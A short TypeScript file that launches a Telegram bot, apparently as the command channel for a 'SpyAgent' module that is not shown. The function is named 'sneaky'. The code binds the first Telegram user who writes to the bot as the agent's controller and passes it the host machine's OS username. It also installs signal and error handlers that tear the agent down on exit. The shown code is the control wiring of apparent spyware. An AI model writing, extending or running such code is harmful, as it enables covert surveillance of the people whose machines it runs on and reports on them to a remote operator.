import { Telegraf } from 'telegraf';
import os from 'os';
import SpyAgent from './spyAgent';

const eventsToHandle = ['SIGTERM', 'SIGINT', 'unhandledRejection', 'uncaughtException', 'SIGUSR2'];

async function sneaky() {
    const bot = new Telegraf(process.env.BOT_TOKEN!);

    const agent = new SpyAgent(bot);

    bot.start((ctx) => {
        ctx.reply('Welcome');
        console.log(ctx);
    });
    bot.on('message', (ctx) => {
        if (agent.isAnonymous()) ctx.reply('agent007 at your service sir.')
        if (agent.isAnonymous()) agent.setUser = ctx.from.id.toString();
    });

    bot.launch();
    agent.whichUser(os.userInfo().username);

    eventsToHandle.forEach((e) => process.on(e, async (err) => {
        agent.die();
        console.log(err);
        return process.exit();
    }));

};

sneaky();